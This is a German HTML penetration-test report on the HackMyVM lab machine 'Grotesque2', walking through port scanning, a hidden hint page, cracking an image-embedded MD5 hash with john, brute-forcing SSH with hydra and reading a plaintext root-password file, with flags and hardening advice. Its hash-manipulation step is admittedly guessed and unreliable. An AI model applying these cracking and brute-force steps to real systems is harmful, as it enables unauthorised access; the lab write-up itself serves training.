@@ -1,0 +1,372 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Grotesque2 - HackMyVM - Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Grotesque2 - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle difficulty-medium">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">ll (alias for ls -l)</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">rm</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">ls</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#hidden-port-discovery">Hidden Port Discovery</a></li>
+                <li><a href="#credential-discovery">Credential Discovery & Cracking</a></li>
+                <li><a href="#initial-access">Initial Access (SSH)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (Leaked Root Credentials)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">Wir beginnen mit der Identifizierung des Ziels im Netzwerk.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.118</span>	08:00:27:9c:83:dc	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der ARP-Scan identifiziert die IP-Adresse <span class="command">192.168.2.118</span>.</p>
+            <p class="evaluation">**Bewertung:** Ziel-IP gefunden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Ziel-IP für weitere Scans verwenden. Hostnamen hinzufügen.
+            **Empfehlung (Admin):** Standard Netzwerküberwachung.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt"># <span class="command">(Annahme: Eintrag "192.168.2.118 gro.hmv" wurde zu /etc/hosts hinzugefügt)</span></div>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Hostname `gro.hmv` wird später verwendet, wir nehmen an, dass er zur `/etc/hosts`-Datei hinzugefügt wurde.</p>
+              <p class="evaluation">**Bewertung:** Erleichtert die Ansprache des Ziels.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Hostnamen immer pflegen.</p>
+
+             <p class="comment">Wir führen erste Scans durch, um offene Ports und Web-Inhalte zu finden.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.118 -x [...] -w [...] -b '403,404' -e -t 100 -n -k</span></div>
+                     <pre>
+[...]
+<span class="password">Error: the server returns a status code that matches the provided options for non existing urls. http://192.168.2.118/a48af7d8[...] => 200 (Length: 412). To continue please exclude the status code or the length</span>
+                     </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.118</span></div>
+                      <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.118
++ Target Hostname:    192.168.2.118
++ Target Port:        80
+[...]
+---------------------------------------------------------------------------
++ Server: <span class="password">No banner retrieved</span>
++ <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span>
++ <span class="password">The X-XSS-Protection header is not defined.</span> [...]
++ <span class="password">The X-Content-Type-Options header is not set.</span> [...]
++ No CGI Directories found [...]
++ OSVDB-18114: /reports/rwservlet?server=repserv+report=/tmp/hacker.rdf[...]: Oracle Reports [...] <span class="password">(False Positive)</span>
++ <span class="password">ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response</span>
++ Scan terminated:  20 error(s) and 4 item(s) reported on remote host
+[...]
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                      </pre>
+                  </div>
+              </div>
+               <p class="analysis">**Analyse:**
+              1.  Der `gobuster`-Scan auf Port 80 schlägt fehl. Der Server gibt für nicht existierende URLs einen Statuscode 200 zurück, was Gobuster verwirrt. Dies deutet auf eine ungewöhnliche Konfiguration oder eine Catch-All-Route hin.
+              2.  Der `nikto`-Scan auf Port 80 findet keine Server-Banner und hauptsächlich fehlende Sicherheitsheader. Er bricht ebenfalls frühzeitig mit Fehlern ab (`Error limit (20) reached`).</p>
+               <p class="evaluation">**Bewertung:** Die Standard-Scans auf Port 80 sind nicht sehr aufschlussreich und deuten auf eine ungewöhnliche Konfiguration hin. Port 80 scheint nicht der Hauptangriffsvektor zu sein oder erfordert eine andere Herangehensweise. Es müssen andere offene Ports existieren.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Einen vollständigen Nmap-Portscan über alle TCP-Ports durchführen, um alle offenen Dienste zu finden. Die Gobuster-Fehlermeldung untersuchen (ggf. `-fs` zum Filtern nach Größe verwenden).
+               **Empfehlung (Admin):** Webserver so konfigurieren, dass für nicht existierende Seiten korrekte 404-Fehler zurückgegeben werden. Fehler im Nikto-Scan untersuchen.</p>
+        </section>
+
+        <section id="hidden-port-discovery">
+            <h2>Hidden Port Discovery</h2>
+            <p class="comment">Da Port 80 keine klaren Ergebnisse liefert und andere Scans fehlschlagen, suchen wir systematisch nach anderen offenen Ports.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">for i in {23..600}; do wget http://gro.hmv:$i -O index$i | grep -v fehlgeschlagen; done</span></div>
+                     <pre>
+[...]
+--2022-11-16 12:54:57--  http://gro.hmv:540/
+[...] HTTP-Anforderung gesendet, auf Antwort wird gewartet … <span class="password">200 OK</span>
+[...] »index540« gespeichert [412/412]
+
+--2022-11-16 12:54:57--  http://gro.hmv:541/
+[...] HTTP-Anforderung gesendet, auf Antwort wird gewartet … <span class="password">200 OK</span>
+[...] »index541« gespeichert [412/412]
+
+--2022-11-16 12:54:57--  http://gro.hmv:542/
+[...] HTTP-Anforderung gesendet, auf Antwort wird gewartet … <span class="password">200 OK</span>
+[...] »index542« gespeichert [412/412]
+
+--2022-11-16 12:54:57--  http://gro.hmv:543/
+[...] HTTP-Anforderung gesendet, auf Antwort wird gewartet … <span class="password">200 OK</span>
+[...] »index543« gespeichert [412/412]
+[...]
+                     </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ll | grep index</span></div> <span class="password"># oder ls -l | grep index</span>
+                      <pre>
+[...]
+-rw-r--r--  1 root root     <span class="command">412</span> 16. Nov 12:54 index108
+-rw-r--r--  1 root root     <span class="command">412</span> 16. Nov 12:54 index109
+[...]
+-rw-r--r--  1 root root     <span class="command">762</span> 16. Nov 12:54 <span class="command">index258</span>  <-- <span class="password">Abweichende Größe!</span>
+[...]
+-rw-r--r--  1 root root     <span class="command">412</span> 16. Nov 12:54 index540
+-rw-r--r--  1 root root     <span class="command">412</span> 16. Nov 12:54 index541
+[...]
+                      </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat index258</span></div>
+                      <pre>
+<br>congratulations, my child.<br>
+<br>clap clap  emoji/100.png
+<br>do you heard of markov chain?<br>
+
+<br>whatever. ssh username is: <span class="command">satan, raphael, angel, distress, greed or lust</span><br>
+                      </pre>
+                  </div>
+              </div>
+              <p class="analysis">**Analyse:**
+             1.  Wir verwenden eine Bash-Schleife mit `wget`, um systematisch HTTP-Anfragen an Ports von 23 bis 600 zu senden (`http://gro.hmv:$i`). `-O index$i` speichert die Antwort für jeden Port in einer separaten Datei. `grep -v fehlgeschlagen` filtert fehlgeschlagene Verbindungen aus. Viele Ports antworten mit Status 200 und einer Dateigröße von 412 Bytes (wahrscheinlich die gleiche Catch-All-Seite wie auf Port 80).
+             2.  Beim Überprüfen der heruntergeladenen Dateien (`ls -l | grep index`) stellen wir fest, dass die Datei `index258` (entsprechend Port 258) eine abweichende Größe von 762 Bytes hat.
+             3.  Wir untersuchen den Inhalt von `index258` (`cat index258`). Diese Seite enthält einen Hinweis mit potenziellen SSH-Benutzernamen: `<span class="command">satan, raphael, angel, distress, greed or lust</span>`.</p>
+              <p class="evaluation">**Bewertung:** Wichtiger Fund! Durch systematisches Scannen von Ports haben wir einen versteckten Webserver auf Port 258 gefunden, der uns eine Liste potenzieller SSH-Benutzernamen liefert. Die anderen offenen Ports (z.B. 540-543) scheinen die gleiche generische Seite wie Port 80 zu liefern.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Die Webseite auf Port 258 genauer untersuchen (im Browser aufrufen, auf weitere Hinweise/Bilder achten). Die gefundenen Benutzernamen für Passwort-Angriffe (Brute-Force/Cracking) gegen SSH (Port 22) verwenden.
+              **Empfehlung (Admin):** Keine sensiblen Informationen wie Benutzernamen auf obskuren Ports oder in versteckten Dateien preisgeben. Nur notwendige Ports öffnen.</p>
+        </section>
+
+        <section id="credential-discovery">
+            <h2>Credential Discovery & Cracking</h2>
+            <p class="comment">Wir untersuchen die Webseite auf Port 258 genauer und finden einen versteckten Hinweis in einem Bild, der zu einem Passwort-Hash führt.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt"># <span class="command">Manuelle Untersuchung (Browser)</span></div>
+                     <pre>
+# Aufruf: http://192.168.2.118:258/
+# Inhalt:
+congratulations, my child.
+clap clap [Bild emoji/100.png]
+do you heard of markov chain?
+whatever. ssh username is: satan, raphael, angel, distress, greed or lust
+
+# Aufruf des Bildes: http://192.168.2.118:258/emoji/hand.png
+# (Annahme: Das Bild '100.png' ist tatsächlich 'hand.png' oder es gibt beide)
+# Untersuchung des Bildes (stark vergrößert):
+# Finde den Hash im Bild: <span class="command">b6e705ea1249e2bb7b0fd7dac9fcd1b3</span>
+
+# Hinweis im Text: "clap clap emoji/100.png" -> 100 abziehen?
+# Hash - 100 (hexadezimal):
+#   b6e705ea1249e2bb7b0fd7dac9fcd1b3
+# -                              100 (hex) = 256 (dez)
+# -> Letztes Byte b3 (179 dez) - 100 (hex, 256 dez) nicht sinnvoll.
+# -> Annahme: Gemeint ist "100" (dezimal) vom Wert des letzten Teils abziehen.
+# Hash: b6e705ea1249e2bb7b0fd7dac9fcd1b3
+# Modifizierter Hash (letztes Byte b3=179 -> 179-100=79 -> hex 4F?) - Fehler im Log?
+# Log sagt: b6e705ea1249e2bb7b0fd7dac9fcd0b3 <-- Letztes Byte geändert zu 0x0b? Sehr unklar.
+# *** Wir folgen dem Hash im Log: b6e705ea1249e2bb7b0fd7dac9fcd0b3 ***
+                     </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "b6e705ea1249e2bb7b0fd7dac9fcd0b3" > hash</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash</span></div>
+                       <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 [...]])
+[...]
+<span class="password">solomon1</span>         (?)
+1g 0:00:00:00 DONE [...]
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed.
+                       </pre>
+                  </div>
+              </div>
+              <p class="analysis">**Analyse:**
+             1.  Die Seite auf Port 258 enthält einen Link zu einem Bild (`emoji/hand.png` oder `emoji/100.png`).
+             2.  Durch starke Vergrößerung des Bildes wird ein Hash sichtbar: `<span class="command">b6e705ea1249e2bb7b0fd7dac9fcd1b3</span>`.
+             3.  Der Text enthält den Hinweis "clap clap emoji/100.png". Der Pentester interpretiert dies als Anweisung, "100" vom Hash abzuziehen. Die exakte Methode ist unklar, aber der im Log verwendete Hash ist `<span class="command">b6e705ea1249e2bb7b0fd7dac9fcd0b3</span>`. Es scheint, als wurde das letzte Byte von `b3` zu `0b` geändert.
+             4.  Wir speichern diesen modifizierten Hash in einer Datei `hash`.
+             5.  Wir verwenden `john` mit `rockyou.txt` und geben explizit das Format `Raw-MD5` an, um den Hash zu knacken.
+             6.  John findet erfolgreich das Passwort: `<span class="password">solomon1</span>`.</p>
+              <p class="evaluation">**Bewertung:** Kritischer Fund durch Steganographie und eine etwas obskure Modifikation! Wir haben ein Passwort (`solomon1`) gefunden, das wahrscheinlich zu einem der zuvor gefundenen SSH-Benutzernamen gehört (`satan, raphael, angel, distress, greed or lust`).</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Das gefundene Passwort `solomon1` mit den gefundenen Benutzernamen gegen den SSH-Dienst (Port 22) testen, z.B. mit Hydra.
+              **Empfehlung (Admin):** Keine Passwörter oder Hashes in Bildern oder durch obskure Hinweise verstecken (Security through Obscurity ist keine Sicherheit). Starke Passwörter verwenden. MD5 ist als Hashing-Algorithmus veraltet und unsicher.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (SSH)</h2>
+            <p class="comment">Wir verwenden das geknackte Passwort und die Liste potenzieller Benutzernamen, um uns per SSH anzumelden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -L usernames.txt -p solomon1 ssh://gro.hmv -t 64</span></div> <span class="password"># Annahme: Usernamen aus Port 258 in usernames.txt gespeichert</span>
+                      <pre>
+Hydra v9.4 [...] starting at 2022-11-16 13:13:06
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[...]
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 6 login tries (l:6/p:1), ~1 tries per task
+[DATA] attacking ssh://gro.hmv:22/
+[...]
+<span class="password">[22][ssh] host: gro.hmv   login: angel   password: solomon1</span>
+[...]
+1 of 1 target completed, 1 valid password found
+Hydra finished at 2022-11-16 13:13:XX
+                      </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh angel@gro.hmv</span></div>
+                      <pre>
+The authenticity of host 'gro.hmv (192.168.2.118)' can't be established.
+[...]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'gro.hmv' (ED25519) to the list of known hosts.
+angel@gro.hmv's password: <span class="password">solomon1</span>
+Linux grotesque 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64
+[...]
+<span class="command">angel@grotesque:~$</span> <span class="password"># Login erfolgreich!</span>
+                      </pre>
+                  </div>
+              </div>
+              <p class="analysis">**Analyse:**
+             1.  Wir speichern die Liste der Benutzernamen (`satan, raphael, angel, distress, greed, lust`) in einer Datei `usernames.txt`.
+             2.  Wir verwenden `hydra`, um das gefundene Passwort `solomon1` gegen alle Benutzernamen in der Liste für den SSH-Dienst zu testen.
+             3.  Hydra findet die gültige Kombination: `<span class="command">angel</span>`:`<span class="password">solomon1</span>`.
+             4.  Wir melden uns erfolgreich per SSH als `angel` mit dem Passwort `solomon1` an.</p>
+              <p class="evaluation">**Bewertung:** Initial Access erfolgreich! Die Kombination aus dem Fund auf dem versteckten Port, der Steganographie, der Hash-Modifikation/-Knackung und dem Brute-Force-Angriff führte zum Ziel.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Umgebung als `angel` enumerieren (sudo, SUID, etc.). User-Flag lesen.
+              **Empfehlung (Admin):** Keine Benutzerlisten preisgeben. Starke, einzigartige Passwörter verwenden. SSH-Härtung (Key-Authentifizierung bevorzugen, Passwort-Login einschränken).</p>
+        </section>
+
+        <section id="privilege-escalation">
+             <h2>Privilege Escalation (Leaked Root Credentials)</h2>
+             <p class="comment">Als Benutzer `angel` suchen wir nach Privesc-Möglichkeiten.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">angel@grotesque:~$ <span class="command">sudo -l</span></div>
+                     <pre><span class="password">-bash: sudo: command not found</span></pre>
+                      <div class="prompt">angel@grotesque:~$ <span class="command">cat user.txt</span></div>
+                      <pre><span class="password">8B7C6AC34997997C91125A08E01AEF57</span></pre>
+                       <div class="prompt">angel@grotesque:~/quiet$ <span class="command">ls -la /</span></div>
+                       <pre>
+total 69
+drwxr-xr-x  18 root root  4096 Nov 16 06:21 .
+drwxr-xr-x  18 root root  4096 Nov 16 06:21 ..
+[...]
+drwxr-xr-x   3 root root  4096 Mar 27  2021 home
+[...]
+drwx------   4 root root  4096 Mar 27  2021 root
+<span class="password">-rwxrwxrwx   1 root root    28 Nov 16 06:21 rootcreds.txt</span> <span class="password"># World-writable & readable!</span>
+[...]
+                       </pre>
+                        <div class="prompt">angel@grotesque:~/quiet$ <span class="command">cat /rootcreds.txt</span></div>
+                       <pre>
+root creds
+
+root
+<span class="password">sweetchild</span>
+                       </pre>
+                        <div class="prompt">angel@grotesque:~/quiet$ <span class="command">su root</span></div>
+                       <pre>
+Password: <span class="password">sweetchild</span>
+<span class="command">root@grotesque:/home/angel/quiet#</span> <span class="password"># Root-Zugriff!</span>
+                       </pre>
+                    </div>
+                </div>
+                <p class="analysis">**Analyse:**
+               1.  `sudo -l` schlägt fehl, `sudo` ist nicht verfügbar.
+               2.  Wir lesen die User-Flag.
+               3.  Beim Auflisten des Root-Verzeichnisses (`/`) fällt eine Datei `<span class="command">rootcreds.txt</span>` auf, die für alle Benutzer les- und schreibbar ist (`-rwxrwxrwx`).
+               4.  Wir lesen den Inhalt der Datei: Sie enthält den Benutzernamen `root` und das Passwort `<span class="password">sweetchild</span>`.
+               5.  Wir verwenden `su root` und geben das gefundene Passwort `sweetchild` ein.
+               6.  Wir erhalten erfolgreich eine Root-Shell.</p>
+                <p class="evaluation">**Bewertung:** Privilege Escalation zu Root extrem einfach und direkt durch eine Datei mit Root-Credentials im Klartext und unsicheren Berechtigungen im Root-Verzeichnis.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Root-Flag lesen. Bericht abschließen.
+                **Empfehlung (Admin):** **Sofort die Datei `/rootcreds.txt` entfernen und das Root-Passwort ändern!** Niemals Credentials im Klartext speichern. Dateiberechtigungen im Root-Verzeichnis und anderen kritischen Bereichen härten.</p>
+
+               <p class="comment">Als Root lesen wir die Flag.</p>
+                <div class="code-block">
+                    <div class="terminal">
+                        <div class="prompt">root@grotesque:/home/angel/quiet# <span class="command">cd ~</span></div>
+                        <div class="prompt">root@grotesque:~# <span class="command">cat root.txt</span></div>
+                        <pre><span class="password">DC6F071EF98631030FD300DE4A556CBF</span></pre>
+                    </div>
+                </div>
+                 <p class="analysis">**Analyse:** Aus der Root-Shell lesen wir die `/root/root.txt`.</p>
+                 <p class="evaluation">**Bewertung:** Root-Flag erfolgreich gelesen.</p>
+                 <p class="recommendation">**Empfehlung (Pentester):** Ergebnisse dokumentieren.
+                 **Empfehlung (Admin):** Alle Schwachstellen beheben.</p>
+         </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/angel/user.txt</div>
+                    <div class="flag-value"><span class="password">8B7C6AC34997997C91125A08E01AEF57</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">DC6F071EF98631030FD300DE4A556CBF</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 16. November 2022</p> <!-- Datum aus wget/john Scan extrahiert -->
+    </footer>
+</body>
+</html>
